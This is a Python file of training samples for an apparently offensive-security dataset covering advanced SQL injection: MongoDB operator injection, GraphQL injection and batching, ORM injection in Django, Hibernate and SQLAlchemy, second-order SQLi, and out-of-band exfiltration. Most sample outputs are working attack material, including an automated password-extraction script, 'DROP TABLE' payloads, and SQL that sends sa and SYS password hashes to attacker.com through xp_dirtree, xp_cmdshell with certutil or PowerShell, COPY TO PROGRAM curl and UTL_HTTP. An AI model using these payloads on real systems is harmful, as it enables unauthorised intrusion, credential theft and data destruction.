#!/usr/bin/env python3
"""
Advanced SQL injection dataset: NoSQL, ORM bypass, GraphQL injection,
second-order SQLi, OOB exfiltration, stored procedure abuse.
"""

from generate_dataset import Sample

ADVANCED_SQLI_SAMPLES = [
    # ── NoSQL Injection (MongoDB) ─────────────────────────────
    Sample(
        instruction="Explain NoSQL injection against MongoDB and demonstrate authentication bypass and data extraction.",
        input="Target: Node.js + Express + MongoDB, login endpoint POST /api/auth/login",
        output="""## MongoDB NoSQL Injection

MongoDB uses JSON-like query operators. Injecting these operators into queries
allows authentication bypass and arbitrary data extraction.

### Authentication Bypass

**Vulnerable Node.js code:**
```javascript
const user = await db.collection('users').findOne({
    username: req.body.username,
    password: req.body.password
});
```

**Attack — operator injection via JSON body:**
```json
POST /api/auth/login
Content-Type: application/json

{
    "username": "admin",
    "password": {"$gt": ""}
}
```

MongoDB interprets `{"$gt": ""}` as "password greater than empty string" → always true.

**Attack — $ne (not equal):**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

**Attack — $regex to enumerate usernames:**
```json
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

### Parameter Pollution (URL-encoded form data)

If the server parses `req.body` from `application/x-www-form-urlencoded`:
```
username=admin&password[$gt]=
```
Express + body-parser converts this to: `{password: {$gt: ''}}` — same effect.

### Blind NoSQL Injection (Boolean-based)

Extract data character by character via regex:
```json
{"username": "admin", "password": {"$regex": "^p"}}   → 200 OK (correct char)
{"username": "admin", "password": {"$regex": "^q"}}   → 401 (wrong char)
```

**Automated extraction script:**
```python
import requests
import string

url = "https://target.com/api/auth/login"
charset = string.ascii_letters + string.digits + "!@#$%^&*"

def check(regex):
    resp = requests.post(url, json={
        "username": "admin",
        "password": {"$regex": regex}
    })
    return resp.status_code == 200

password = ""
while True:
    found = False
    for ch in charset:
        if check(f"^{re.escape(password + ch)}"):
            password += ch
            print(f"[+] Password so far: {password}")
            found = True
            break
    if not found:
        break

print(f"[+] Password: {password}")
```

### $where Operator Injection (JS execution)

If `$where` is allowed:
```json
{
    "username": "admin",
    "$where": "this.password.length > 0 && sleep(5000)"
}
```
→ Time-based blind injection using JavaScript execution in MongoDB.

### Array-based Injection

```json
{"username": {"$in": ["admin", "root", "administrator"]}}
```

### Projection Injection (Field Exfiltration)

If projection fields come from user input:
```
GET /api/users/profile?fields=username,email,password
```
```javascript
db.collection('users').findOne({_id: userId}, {[userFields]: 1})
```
→ Inject `password` field into projection to exfiltrate hashes.

### Tools

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap
python3 nosqlmap.py --attack 2 --victim target.com --webPort 443 \
    --uri /api/auth/login --httpMethod POST

# nosqli (Go)
nosqli -u "https://target.com/api/auth/login" \
    --param username --data '{"username":"INJECT","password":"pass"}'
```
""",
        category="sqli",
        subcategory="nosql_injection",
    ),
    # ── GraphQL Injection ─────────────────────────────────────
    Sample(
        instruction="How do you perform injection attacks and information disclosure against GraphQL APIs?",
        input="Target: GraphQL endpoint at /graphql, introspection potentially enabled",
        output="""## GraphQL Security Testing

GraphQL APIs expose a rich attack surface: introspection, injection, IDOR, batching abuse, and DoS.

### Step 1: Fingerprint and Enable Introspection

```bash
# Basic probe
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'

# Full introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
```

**If introspection is blocked, try:**
```graphql
# Fragment-based bypass
query { __type(name: "User") { fields { name type { name } } } }

# Field suggestion (typo reveals valid fields)
query { usr { id } }
# Error: "Did you mean 'user'?"
```

### Step 2: Enumerate Schema Manually

```graphql
# List all types
{ __schema { queryType { fields { name description } } } }

# Enumerate mutations
{ __schema { mutationType { fields { name args { name type { name } } } } } }
```

### Step 3: SQL/NoSQL Injection via Arguments

```graphql
# SQLi in argument
query {
  user(id: "1 OR 1=1--") {
    id
    username
    email
  }
}

# Boolean-based blind
query {
  user(id: "1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'") {
    id
  }
}

# Time-based
query {
  user(id: "1; SELECT SLEEP(5)--") {
    id
  }
}
```

### Step 4: IDOR via Mutations

```graphql
# Delete another user's data
mutation {
  deletePost(id: "1337") {
    success
  }
}

# Mass assignment via mutation
mutation {
  updateProfile(input: {
    userId: "victim_id",
    role: "admin",
    email: "attacker@evil.com"
  }) {
    user { id role }
  }
}
```

### Step 5: Batching Attack (Authentication Bypass)

GraphQL allows multiple operations in one request — use to brute-force:
```json
POST /graphql
[
  {"query": "mutation { login(username:\"admin\",password:\"pass1\") { token } }"},
  {"query": "mutation { login(username:\"admin\",password:\"pass2\") { token } }"},
  {"query": "mutation { login(username:\"admin\",password:\"pass3\") { token } }"}
]
```
Each mutation runs independently, bypassing rate limits on a per-request basis.

### Step 6: Alias-based Batching (Rate Limit Bypass)

```graphql
mutation {
  a1: login(username: "admin", password: "pass1") { token }
  a2: login(username: "admin", password: "pass2") { token }
  a3: login(username: "admin", password: "pass3") { token }
}
```

### Step 7: Deeply Nested Query DoS

```graphql
query evil {
  users {
    friends {
      friends {
        friends {
          friends {
            friends { id name }
          }
        }
      }
    }
  }
}
```
→ Exponential database queries.

### Tools

```bash
# graphw00f — fingerprint GraphQL engine
graphw00f -t https://target.com/graphql

# InQL — Burp extension + standalone
python3 inql.py -t https://target.com/graphql --generate-html

# graphql-cop — security audit
graphql-cop -t https://target.com/graphql -o report.json

# clairvoyance — schema recovery without introspection
python3 clairvoyance.py -u https://target.com/graphql \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
""",
        category="sqli",
        subcategory="graphql_injection",
    ),
    # ── ORM Injection ────────────────────────────────────────
    Sample(
        instruction="Describe SQL injection through ORM layers — Django ORM, Hibernate, and SQLAlchemy vulnerabilities.",
        input="",
        output="""## ORM-based SQL Injection

While ORMs parameterize queries by default, specific patterns expose raw SQL execution.

### Django ORM Vulnerabilities

**1. `extra()` method (deprecated but common)**
```python
# VULNERABLE
User.objects.extra(where=["username = '%s'" % username])

# Exploit: username = "' OR '1'='1"
```

**2. `RawSQL()` with user input**
```python
from django.db.models.expressions import RawSQL

# VULNERABLE
queryset = User.objects.annotate(
    extra=RawSQL(f"SELECT {user_input} FROM auth_user", [])
)
# Inject: user_input = "(SELECT password FROM auth_user WHERE username='admin')"
```

**3. `order_by()` with raw column names**
```python
# VULNERABLE
User.objects.all().order_by(request.GET.get('sort', 'username'))

# Exploit: sort = "(SELECT CASE WHEN (1=1) THEN username ELSE email END)"
# Time-based: sort = "(SELECT CASE WHEN (SLEEP(5)) THEN username ELSE email END)"
```

**4. `__regex` operator on MySQL**
```python
# MySQL REGEXP can be used for boolean-based blind
User.objects.filter(username__regex=f"^{char_to_test}")
```

### Hibernate (Java) Vulnerabilities

**1. HQL Injection (Hibernate Query Language)**
```java
// VULNERABLE
String hql = "FROM User WHERE username = '" + username + "'";
Query q = session.createQuery(hql);

// Payload: username = "' OR '1'='1
// HQL injection: ' UNION FROM User WHERE '1'='1
```

**2. Criteria API with raw restrictions**
```java
// VULNERABLE
criteria.add(Restrictions.sqlRestriction(
    "username = '" + userInput + "'"  // Raw SQL in Criteria
));
```

**3. Named queries with concatenation**
```java
// In persistence.xml or annotation:
@NamedQuery(name="getUser", query="FROM User u WHERE u.username = :username")
// But if developer does:
session.createQuery("FROM User WHERE username = '" + input + "'")  // Bypass named query
```

### SQLAlchemy (Python) Vulnerabilities

**1. `text()` with f-string**
```python
from sqlalchemy import text

# VULNERABLE
query = text(f"SELECT * FROM users WHERE username = '{username}'")
result = db.execute(query)

# Safe:
query = text("SELECT * FROM users WHERE username = :username")
result = db.execute(query, {"username": username})
```

**2. `filter()` with string expressions**
```python
# VULNERABLE — direct string passed to filter
User.query.filter(f"username = '{username}'")
```

**3. Order-by injection**
```python
# VULNERABLE
column = request.args.get('sort')
User.query.order_by(text(column))  # Direct text() injection

# Exploit: sort = "(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END)"
```

### Detection Methodology

```bash
# Look for raw SQL in codebases
grep -rn "execute\|raw\|RawSQL\|extra(" --include="*.py" | grep -v "#"
grep -rn "createQuery\|createNativeQuery" --include="*.java"
grep -rn "text(" --include="*.py" | grep -E "f\"|format\|%"

# Dynamic: order_by fuzzing
curl "https://target.com/api/users?sort=username"
curl "https://target.com/api/users?sort=1))+--+"
curl "https://target.com/api/users?sort=(SELECT+SLEEP(5))--"
```

### Exploitation via order_by (Error-based, MySQL)

```
?sort=CASE+WHEN+(1=1)+THEN+1+ELSE+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version()))))+END
```

**MSSQL error-based via order_by:**
```
?sort=(SELECT+TOP+1+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+FOR+XML+PATH(''))
```
""",
        category="sqli",
        subcategory="orm_injection",
    ),
    # ── Second-Order SQLi ────────────────────────────────────
    Sample(
        instruction="Explain second-order SQL injection — how data stored safely can execute maliciously later.",
        input="Target: User registration → profile update → admin panel query flow",
        output="""## Second-Order (Stored) SQL Injection

Second-order SQLi occurs in two phases:
1. **Phase 1**: Malicious data is **stored safely** (properly escaped)
2. **Phase 2**: Stored data is **retrieved and used unsafely** in a new query

### Why Parameterization Alone Fails

```python
# Phase 1 — Registration (SAFE, parameterized)
cursor.execute(
    "INSERT INTO users (username, password) VALUES (%s, %s)",
    (username, password)
)
# username = "admin'--" stored literally in DB ✓

# Phase 2 — Password change (VULNERABLE, string concatenation)
stored_username = cursor.fetchone()[0]  # Retrieves: admin'--
cursor.execute(
    f"UPDATE users SET password='{new_pass}' WHERE username='{stored_username}'"
)
# Becomes: UPDATE users SET password='x' WHERE username='admin'--'
# '--' comments out the trailing quote → updates admin's password!
```

### Full Attack Scenario

**Step 1: Register with malicious username**
```
POST /register
username=admin'--&password=attacker_pass
```
Username stored as: `admin'--` (safely escaped in INSERT)

**Step 2: Change your own password**
```
POST /change_password
new_password=hacked123
```
Server retrieves `admin'--` from DB, builds:
```sql
UPDATE users SET password='hacked123' WHERE username='admin'--'
```
→ Admin's password is now `hacked123`

### Detecting Second-Order SQLi

**Black-box approach:**
1. Register with payload in username/email/etc.
2. Observe all features that use stored data (profile update, search, export)
3. For each feature, test if payload executes

**Payloads to store:**
```
admin'--
' OR '1'='1
' OR 1=1--
1'; DROP TABLE users--
' UNION SELECT 1,2,3--
```

**Time-based detection:**
```
username: admin'; SELECT SLEEP(5)--
# Then: change password, update profile, use search features
# If 5-second delay occurs → second-order SQLi confirmed
```

### Code Review Patterns to Identify

```python
# Pattern 1: Retrieve from DB then use in query without parameterization
user_data = db.fetchone()  # Retrieved from DB (trusted?)
cursor.execute(f"SELECT * FROM ... WHERE id='{user_data['username']}'")

# Pattern 2: Template strings with DB values
query = "SELECT * FROM orders WHERE customer='" + username_from_db + "'"

# Pattern 3: Stored API keys, tokens used in queries
api_key = get_user_api_key(user_id)
cursor.execute(f"SELECT * FROM services WHERE key='{api_key}'")
```

### Advanced: Second-Order in ORM

```python
# Django: stored value used in extra()
user = User.objects.get(id=user_id)
# user.username might be: ') OR 1=1--
results = User.objects.extra(
    where=[f"department = '{user.username}'"]  # VULNERABLE
)
```

### Payloads for Different SQL Contexts

**UPDATE statement:**
```sql
', password='hacked' WHERE '1'='1
', role='admin' WHERE username='victim'--
```

**SELECT context:**
```sql
' UNION SELECT username, password, 3 FROM users--
```

**INSERT context (stored in another table):**
```sql
value', (SELECT password FROM users WHERE username='admin'), '3
```
""",
        category="sqli",
        subcategory="second_order",
    ),
    # ── Out-of-Band SQLi ─────────────────────────────────────
    Sample(
        instruction="How do you exfiltrate data via out-of-band (OOB) SQL injection when no response is visible?",
        input="Target: MSSQL server with outbound network access, blind injection confirmed",
        output="""## Out-of-Band SQL Injection Exfiltration

OOB SQLi exfiltrates data through a separate channel (DNS, HTTP) when:
- No response body contains query results
- Time delays are unreliable (busy server, network jitter)
- Direct HTTP response manipulation is impossible

### Prerequisites
- The database server can make outbound network requests
- Attacker controls a DNS/HTTP listener (Burp Collaborator, interactsh)

### MSSQL — DNS Exfiltration via xp_dirtree

```sql
-- Basic connectivity test
'; EXEC master..xp_dirtree '//your-collaborator.oastify.com/test'--

-- Exfiltrate current database name
'; DECLARE @d NVARCHAR(100);
SET @d = (SELECT DB_NAME());
EXEC master..xp_dirtree '//' + @d + '.your-collaborator.oastify.com/x'--

-- Exfiltrate sa password hash
'; DECLARE @h NVARCHAR(512);
SET @h = (SELECT CONVERT(NVARCHAR(512), password_hash, 2)
          FROM sys.sql_logins WHERE name='sa');
EXEC master..xp_dirtree '//' + @h + '.your-collaborator.oastify.com/x'--
```

### MSSQL — HTTP Exfiltration via xp_cmdshell

```sql
-- Enable xp_cmdshell (if sa privileges)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

-- Exfiltrate via certutil/curl
'; EXEC xp_cmdshell
   'certutil -urlcache -split -f "http://attacker.com/?d=$(whoami)" nul'--

'; EXEC xp_cmdshell
   'powershell -c "Invoke-WebRequest -Uri http://attacker.com/?d=$env:USERDOMAIN -UseBasicParsing"'--
```

### MySQL — DNS via LOAD_FILE / UNC Path

```sql
-- Windows MySQL server:
SELECT LOAD_FILE('\\\\attacker.com\\share\\file');

-- MySQL 5.6+: OOB via outfile to UNC
SELECT table_name FROM information_schema.tables
INTO OUTFILE '\\\\attacker.com\\share\\data.txt';
```

### PostgreSQL — DNS via dblink / copy

```sql
-- Via COPY TO/FROM with network path
'; COPY (SELECT version()) TO PROGRAM
   'curl -d @- http://attacker.com/?q='--

-- Via dblink (if extension available)
'; SELECT dblink_connect('host=your-collaborator.oastify.com dbname=x')--
```

### Oracle — DNS via UTL_HTTP / UTL_FILE

```sql
-- UTL_HTTP request
'; DECLARE req UTL_HTTP.REQ; resp UTL_HTTP.RESP;
  BEGIN
    req := UTL_HTTP.BEGIN_REQUEST(
      'http://attacker.com/?d='||
      (SELECT password FROM dba_users WHERE username='SYS')
    );
    resp := UTL_HTTP.GET_RESPONSE(req);
  END;--

-- DBMS_LDAP DNS lookup
'; SELECT DBMS_LDAP.INIT(
    (SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com', 389
  ) FROM dual--
```

### Chunked Exfiltration (for long values)

Data may exceed DNS label limits (63 chars) or HTTP GET limits:
```sql
-- MSSQL: chunk long value into multiple DNS lookups
'; DECLARE @full NVARCHAR(MAX), @chunk NVARCHAR(60), @i INT;
SET @full = (SELECT master_key_password_hash FROM sys.key_encryptions);
SET @i = 1;
WHILE @i <= LEN(@full)
BEGIN
  SET @chunk = SUBSTRING(@full, @i, 60);
  EXEC master..xp_dirtree '//' + CAST(@i AS VARCHAR) + '-' + @chunk + '.attacker.com/x';
  SET @i = @i + 60;
END--
```

### Listener Setup

```bash
# interactsh (preferred)
interactsh-client -v

# Custom DNS server
sudo python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 53))
while True:
    data, addr = s.recvfrom(1024)
    print(f'DNS from {addr}: {data}')
"

# SQLMap with OOB
sqlmap -u "https://target.com/item?id=1" \
    --dns-domain=attacker.com \
    --technique=D \
    --dump -T users
```
""",
        category="sqli",
        subcategory="out_of_band",
    ),
]
